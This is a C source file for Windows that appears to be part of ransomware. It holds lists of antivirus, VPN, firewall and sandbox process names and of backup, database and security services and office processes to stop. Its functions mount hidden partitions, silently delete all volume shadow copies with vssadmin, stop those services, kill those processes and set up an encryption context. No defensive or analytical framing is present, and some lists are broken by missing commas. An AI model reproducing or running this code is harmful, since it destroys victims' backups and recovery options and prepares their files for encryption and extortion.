#include <windows.h>
#include <tlhelp32.h>

#include "another.h"
#include "memory.h"
#include "debug.h"

unsigned char *more_programs[] = {
    // Anti-Virus Programs =======================================================
    "MsMpEng.exe",                   // Windows Defender (Microsoft)
    "VsTskMgr.exe",                  // McAfee AntiVirus (McAfee, LLC)
    "ccSvcHst.exe",                  // Norton AntiVirus (NortonLifeLock Inc.)
    "NS.exe",                        // Norton AntiVirus (NortonLifeLock Inc.)
    "avgsvc.exe",                    // AVG AntiVirus (AVG Technologies)
    "avgui.exe",                     // AVG AntiVirus (AVG Technologies)
    "TiMiniService.exe",             // Trend Micro Antivirus+ (Trend Micro Inc.)
    "TmPfw.exe",                     // Trend Micro Antivirus+ (Trend Micro Inc.)
    "egui.exe",                      // ESET NOD32 Antivirus (ESET, LLC)
    "ekrn.exe",                      // ESET NOD32 Antivirus (ESET, LLC)
    "fsav.exe",                      // F-Secure Anti-Virus (F-Secure Corporation)
    "fsorsp.exe",                    // F-Secure Anti-Virus (F-Secure Corporation)
    "AVKTray.exe",                   // G DATA AntiVirus (G DATA Software AG)
    "AVKWCtl.exe",                   // G DATA AntiVirus (G DATA Software AG)
    "BgSvc.exe",                     // BullGuard Antivirus (BullGuard Ltd.)
    "BdVpnApp.exe",                  // BullGuard Antivirus (BullGuard Ltd.)
    "SBAMTray.exe",                  // Vipre Antivirus (J2 Global)
    "SBAMCommandLineScanner.exe",    // Vipre Antivirus (J2 Global)
    "SophosCleanService.exe",        // Sophos Home (Sophos)
    "SAVService.exe",                // Sophos Home (Sophos)
    "mbamtray.exe",                  // Malwarebytes Anti-Malware (Malwarebytes)
    "mbam.exe",                      // Malwarebytes Anti-Malware (Malwarebytes)
    "mbamservice.exe",               // Malwarebytes Anti-Malware (Malwarebytes)
    "mbamgui.exe",                   // Malwarebytes Anti-Malware (Malwarebytes)
    "AvastUI.exe",                   // Avast Antivirus (Avast Software)
    "AvastSvc.exe",                  // Avast Antivirus (Avast Software)
    "AvastBrowser.exe",              // Avast Secure Browser (Avast Software)
    "avp.exe",                       // Kaspersky Anti-Virus (Kaspersky Lab)
    "avpui.exe",                     // Kaspersky Anti-Virus (Kaspersky Lab)
    "KasperskyInternetSecurity.exe", // Kaspersky Internet Security (Kaspersky Lab)
    "ksde.exe",                      // Kaspersky Security Data Escort Adapter (Kaspersky Lab)
    "avpui.exe",                     // Kaspersky Internet Security (Kaspersky Lab)
    "BitdefenderAgent.exe",          // Bitdefender (Bitdefender)
    "bdagent.exe",                   // Bitdefender (Bitdefender)
    "bdredline.exe",                 // Bitdefender (Bitdefender)
    "bdreinit.exe",                  // Bitdefender (Bitdefender)
    "K7TSMain.exe"                   // K7 Total Security (K7 Computing)
    // Vpn Programs ===========================================
    "ExpressVPN.exe",                // ExpressVPN (ExpressVPN International Ltd.)
    "NordVPN.exe",                   // NordVPN (Tefincom S.A.)
    "CGVPNCliService.exe",           // CyberGhost VPN (CyberGhost S.A.)
    "CyberGhost.exe",                // CyberGhost VPN (CyberGhost S.A.)
    "HSSCP.exe",                     // Hotspot Shield VPN (Pango Inc.)
    "HSSCP64.exe",                   // Hotspot Shield VPN (Pango Inc.)
    "pia_manager.exe",               // Private Internet Access (Private Internet Access, Inc.)
    "ProtonVPN.exe",                 // ProtonVPN (Proton Technologies AG)
    "ProtonVPNService.exe",          // ProtonVPN (Proton Technologies AG)
    "Surfshark.exe",                 // Surfshark VPN (Surfshark Ltd.)
    "SurfsharkService.exe",          // Windscribe VPN (Windscribe Limited)
    "Windscribe.exe",                // Windscribe VPN (Windscribe Limited)
    "WindscribeService.exe",         // Windscribe VPN (Windscribe Limited)
    "vyprvpn.exe",                   // VyprVPN (Golden Frog GmbH)
    "VyperVPNService.exe",           // VyprVPN (Golden Frog GmbH)
    "TunnelBear.exe",                // TunnelBear VPN (TunnelBear LLC)
    "TunnelBearMaintenance.exe",     // TunnelBear VPN (TunnelBear LLC)
    "HideMe.exe",                    // Hide.me VPN (eVenture Ltd.)
    "HideMeService.exe",             // Hide.me VPN (eVenture Ltd.)
    "IvacyVPN.exe",                  // Ivacy VPN (PMG Pte. Ltd.)
    "IvacyVPNService.exe",           // Ivacy VPN (PMG Pte. Ltd.)
    "ZenMate.exe",                   // ZenMate VPN (ZenGuard GmbH)
    "ZenMateService.exe",            // ZenMate VPN (ZenGuard GmbH)
    "HMA.exe",                       // HMA VPN (Privax Ltd.)
    "HMAService.exe",                // HMA VPN (Privax Ltd.)
    "StrongVPN.exe",                 // StrongVPN (Strong Technology LLC)
    "StrongVPNService.exe",          // StrongVPN (Strong Technology LLC)
    // Firewall Program ===========================================
    "mcshield.exe",                  // McAfee Endpoint Security (McAfee)
    "mfemms.exe",                    // McAfee Endpoint Security (McAfee)
    "mfefire.exe",                   // McAfee Endpoint Security (McAfee)
    "vsmon.exe",                     // ZoneAlarm Firewall (Zone Labs)
    "ZoneAlarm.exe",                 // ZoneAlarm Firewall (Zone Labs)
    "vsmain.exe",                    // ZoneAlarm Firewall (Zone Labs)
    "fwservice.exe",                 // Comodo Firewall (Comodo)
    "cfp.exe",                       // Comodo Firewall (Comodo)
    "cmdagent.exe",                  // Comodo Firewall (Comodo)
    "ss3svc32.exe",                  // Windows Defender Firewall (Microsoft)
    "ss3svc64.exe",                  // Windows Defender Firewall (Microsoft)
    "MpCmdRun.exe",                  // Windows Defender Firewall (Microsoft)
    "mpsvc.dll",                     // Windows Defender Firewall (Microsoft)
    "McAfeeFire.exe",                // McAfee Firewall (McAfee)
    "mfevtps.exe",                   // McAfee Firewall (McAfee)
    // Sandbox Program ===========================================
    "SandboxieRpcSs.exe",            // Sandboxie (Sophos)
    "SbieSvc.exe",                   // Sandboxie (Sophos)
    "SbieCtrl.exe",                  // Sandboxie (Sophos)
    "Cuckoo.exe",                    // Cuckoo Sandbox (Cuckoo Foundation)
    "Cuckoo.py",                     // Cuckoo Sandbox (Cuckoo Foundation)
    "malbox.exe",                    // Malbox (InQuest Labs)
    "mbox.exe",                      // Malbox (InQuest Labs)
    "firejail",                      // Firejail (netblue30)
};
static const CHAR* services_to_stop[] = {
  "vss", // Microsoft Volume Shadow Copy Service used for backup and restore operations
  "sql", // Microsoft SQL Server database software
  "svc$", // This is the suffix used for Windows service names, e.g. "spoolsv.exe" for the print spooler service
  "memtas", // Symantec Mail Security software
  "mepocs", // Symantec Mail Security software
  "sophos", // Sophos antivirus software
  "veeam", // Veeam backup software
  "backup", // This is not a specific program or process, but likely refers to a backup service or software
  "GxVss", // Genie Backup Manager backup software
  "GxBlr", // Genie Backup Manager backup software
  "GxFWD", // Genie Backup Manager backup software
  "GxCVD", // Genie Backup Manager backup software
  "GxCIMgr", // Genie Timeline backup software
  "DefWatch", // Symantec Endpoint Protection software
  "ccEvtMgr", // Symantec Endpoint Protection software
  "ccSetMgr", // Symantec Endpoint Protection software
  "SavRoam", // Symantec Endpoint Protection software
  "RTVscan", // Symantec Endpoint Protection software
  "QBFCService", // QuickBooks software service
  "QBIDPService", // QuickBooks software service
  "Intuit.QuickBooks.FCS", // QuickBooks software service
  "QBCFMonitorService", // QuickBooks software service
  "YooBackup", // YooBackup backup software
  "YooIT" // YooIT backup software
  "zhudongfangyu", // Chinese antivirus software
  "sophos", // Sophos antivirus software
  "stc_raw_agent", // Software used for security and system management
  "VSNAPVSS", // Veeam backup software
  "VeeamTransportSvc", // Veeam backup software
  "VeeamDeploymentService", // Veeam backup software
  "VeeamNFSSvc", // Veeam backup software
  "veeam", // Veeam backup software
  "PDVFSService", // Used by Paragon Backup & Recovery software
  "BackupExecVSSProvider", // Symantec Backup Exec software
  "BackupExecAgentAccelerator", // Symantec Backup Exec software
  "BackupExecAgentBrowser", // Symantec Backup Exec software
  "BackupExecDiveciMediaService", // Symantec Backup Exec software
  "BackupExecJobEngine", // Symantec Backup Exec software
  "BackupExecManagementService", // Symantec Backup Exec software
  "BackupExecRPCService", // Symantec Backup Exec software
  "AcrSch2Svc", // Acronis backup software
  "AcronisAgent", // Acronis backup software
  "CASAD2DWebSvc", // CA ARCserve D2D backup software
  "CAARCUpdateSvc" // CA ARCserve backup software
};
static const WCHAR* processes_to_stop[] = {
  L"sql.exe", // Microsoft SQL Server database software executable
  L"oracle.exe", // Oracle database software executable
  L"ocssd.exe", // Oracle Clusterware executable
  L"dbsnmp.exe", // Oracle database software executable
  L"synctime.exe", // Utility to synchronize computer time with an internet time server
  L"agntsvc.exe", // Altiris Agent software executable
  L"isqlplussvc.exe", // Oracle SQL*Plus executable
  L"xfssvccon.exe", // Xerox File Transfer Service executable
  L"mydesktopservice.exe", // Citrix Workspace app executable
  L"ocautoupds.exe", // Oracle AutoUpdater executable
  L"encsvc.exe", // Microsoft Encrypting File System executable
  L"firefox.exe", // Mozilla Firefox web browser executable
  L"tbirdconfig.exe", // Mozilla Thunderbird email client executable
  L"mydesktopqos.exe", // Citrix Workspace app executable
  L"ocomm.exe", // Oracle Communications Session Monitor executable
  L"dbeng50.exe", // Sybase Adaptive Server Anywhere executable
  L"sqbcoreservice.exe", // Acronis backup software executable
  L"excel.exe", // Microsoft Excel spreadsheet software executable
  L"infopath.exe", // Microsoft InfoPath form software executable
  L"msaccess.exe", // Microsoft Access database software executable
  L"mspub.exe", // Microsoft Publisher desktop publishing software executable
  L"onenote.exe", // Microsoft OneNote note-taking software executable
  L"outlook.exe", // Microsoft Outlook email client software executable
  L"powerpnt.exe", // Microsoft PowerPoint presentation software executable
  L"steam.exe", // Steam gaming platform executable
  L"thebat.exe", // The Bat! email client executable
  L"thunderbird.exe", // Mozilla Thunderbird email client executable
  L"visio.exe", // Microsoft Visio diagram software executable
  L"winword.exe", // Microsoft Word word processing software executable
  L"wordpad.exe", // Microsoft WordPad text editor executable
  L"notepad.exe" // Microsoft Notepad text editor executable
};

void _load_hidden_partitions() {
  LPCWSTR driveLetters[26] = {
    L"Q:\\", L"W:\\", L"E:\\", L"R:\\", L"T:\\",
    L"Y:\\", L"U:\\", L"I:\\", L"O:\\", L"P:\\",
    L"A:\\", L"S:\\", L"D:\\", L"F:\\", L"G:\\",
    L"H:\\", L"J:\\", L"K:\\", L"L:\\", L"Z:\\",
    L"X:\\", L"C:\\", L"V:\\", L"B:\\", L"N:\\",
    L"M:\\"
  };
  LPCWSTR freeLetters[26];

  DWORD driveCounter = 0;
  DWORD driveSize = 120;
  DWORD retSize = 0;
  WCHAR drive[260];

  for (int i = 0; i < 26; i++) {
    if (GetDriveTypeW(driveLetters[i]) == DRIVE_NO_ROOT_DIR) {
      freeLetters[driveCounter++] = driveLetters[i];
    }
  }

  drive[0] = L'\0';
  if (WCHAR* volume = (WCHAR*)_halloc(32768 * sizeof(WCHAR))) {
    if (WCHAR* partition = (WCHAR*)_halloc(32768 * sizeof(WCHAR))) {
      HANDLE hFind = FindFirstVolumeW(volume, 32768);
      do {
        if (driveCounter > 0) {
          if (GetVolumePathNamesForVolumeNameW(volume, drive, driveSize, &retSize)) {
            if (lstrlenW(drive) == 3) {
              drive[0] = L'\0';
              continue;
            }
          }
          SetVolumeMountPointW(freeLetters[--driveCounter], volume);
        } else break;
      } while (FindNextVolumeW(hFind, volume, 32768));
      FindVolumeClose(hFind);
      _hfree(partition);
    }
    _hfree(volume);
  }
}

BOOL IsWow64() {
  BOOL bIsWow64 = 0;
  typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
  LPFN_ISWOW64PROCESS fnIsWow64Process;
  fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandleA("kernel32.dll"), "IsWow64Process");

  if (0 != fnIsWow64Process) {
    if (!fnIsWow64Process(GetCurrentProcess(), &bIsWow64)) {
      bIsWow64 = 0;
    }
  }
  return bIsWow64;
}

void _remove_shadows() {
  PVOID oldValue = 0;

  if (IsWow64()) {
    typedef BOOL(WINAPI* fnc)(PVOID*);
    HMODULE lib = LoadLibraryA("kernel32.dll");
    FARPROC addr = GetProcAddress(lib, "Wow64DisableWow64FsRedirection");
    if (addr) ((fnc)addr)(&oldValue);
  }

  ShellExecuteW(0, L"open", L"cmd.exe", L"/c vssadmin.exe delete shadows /all /quiet", 0, SW_HIDE);

  if (IsWow64()) {
    typedef BOOL(WINAPI* fnc)(PVOID);
    HMODULE lib = LoadLibraryA("kernel32.dll");
    FARPROC addr = GetProcAddress(lib, "Wow64RevertWow64FsRedirection");
    if (addr) ((fnc)addr)(oldValue);
  }
}

void _stop_services() {
  SERVICE_STATUS_PROCESS sspMain;
  SERVICE_STATUS_PROCESS sspDep;

  ENUM_SERVICE_STATUSA ess;

  DWORD dwBytesNeeded;
  DWORD dwWaitTime;
  DWORD dwCount;

  LPENUM_SERVICE_STATUSA lpDependencies = 0;

  DWORD dwStartTime = GetTickCount();
  DWORD dwTimeout = 30000;

  if (SC_HANDLE scManager = OpenSCManagerA(0, 0, SC_MANAGER_ALL_ACCESS)) {
    for (int i = 0; i < _countof(services_to_stop); i++) {
      if (SC_HANDLE schHandle = OpenServiceA(
        scManager,
        services_to_stop[i],
        SERVICE_STOP |
        SERVICE_QUERY_STATUS |
        SERVICE_ENUMERATE_DEPENDENTS)) {
        if (QueryServiceStatusEx(schHandle,
          SC_STATUS_PROCESS_INFO,
          (LPBYTE)&sspMain,
          sizeof(SERVICE_STATUS_PROCESS),
          &dwBytesNeeded)) {
          if (sspMain.dwCurrentState != SERVICE_STOPPED && sspMain.dwCurrentState != SERVICE_STOP_PENDING) {
            if (!EnumDependentServicesA(schHandle,
              SERVICE_ACTIVE,
              lpDependencies,
              0,
              &dwBytesNeeded,
              &dwCount)) {
              if (GetLastError() == ERROR_MORE_DATA) {
                if (lpDependencies = (LPENUM_SERVICE_STATUSA)_halloc(dwBytesNeeded)) {
                  if (EnumDependentServicesA(schHandle,
                    SERVICE_ACTIVE,
                    lpDependencies,
                    dwBytesNeeded,
                    &dwBytesNeeded,
                    &dwCount)) {
                    ess = *(lpDependencies + i);

                    if (SC_HANDLE hDepService = OpenServiceA(
                      scManager,
                      ess.lpServiceName,
                      SERVICE_STOP |
                      SERVICE_QUERY_STATUS)) {
                      if (ControlService(hDepService,
                        SERVICE_CONTROL_STOP,
                        (LPSERVICE_STATUS)&sspDep)) {
                        while (sspDep.dwCurrentState != SERVICE_STOPPED) {
                          Sleep(sspDep.dwWaitHint);
                          if (QueryServiceStatusEx(
                            hDepService,
                            SC_STATUS_PROCESS_INFO,
                            (LPBYTE)&sspDep,
                            sizeof(SERVICE_STATUS_PROCESS),
                            &dwBytesNeeded)) {
                            if (sspDep.dwCurrentState == SERVICE_STOPPED || GetTickCount() - dwStartTime > dwTimeout) {
                              break;
                            }
                          }
                        }

                        CloseServiceHandle(hDepService);
                      }
                    }
                  }

                  _hfree(lpDependencies);
                }
              }
            }
            if (ControlService(schHandle,
              SERVICE_CONTROL_STOP,
              (LPSERVICE_STATUS)&sspMain)) {
              while (sspMain.dwCurrentState != SERVICE_STOPPED) {
                Sleep(sspMain.dwWaitHint);
                if (!QueryServiceStatusEx(
                  schHandle,
                  SC_STATUS_PROCESS_INFO,
                  (LPBYTE)&sspMain,
                  sizeof(SERVICE_STATUS_PROCESS),
                  &dwBytesNeeded)) {
                  goto stop_cleanup;
                }

                if (sspMain.dwCurrentState == SERVICE_STOPPED)
                  break;

                if (GetTickCount() - dwStartTime > dwTimeout) {
                  goto stop_cleanup;
                }
              }
            }
          }
        }

      stop_cleanup:;
        CloseServiceHandle(schHandle);
      }
    }

    CloseServiceHandle(scManager);
  }
}

void _stop_processes() {
  // Take a snapshot of all running processes
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
	// Initialize a PROCESSENTRY32 structure to store information about each process
	PROCESSENTRY32W pEntry;
	pEntry.dwSize = sizeof(pEntry);
	// Iterate over each process in the snapshot
	BOOL hRes = Process32FirstW(hSnapShot, &pEntry);
  while (hRes) {
    for (int i = 0; i < _countof(processes_to_stop); i++) {
      if (lstrcmpW(processes_to_stop[i], pEntry.szExeFile) == 0) {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, (DWORD)pEntry.th32ProcessID);
        if (hProcess != NULL) {
          TerminateProcess(hProcess, 9);
          CloseHandle(hProcess);
        }
        break;
      }
    }
    // Move to the next process in the snapshot
    hRes = Process32NextW(hSnapShot, &pEntry);
  }
  CloseHandle(hSnapShot);
}

HCRYPTPROV gen_context() {
  HCRYPTPROV hProv = NULL;
  if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) &&
    !CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_NEWKEYSET)) hProv = NULL;
  return hProv;
}
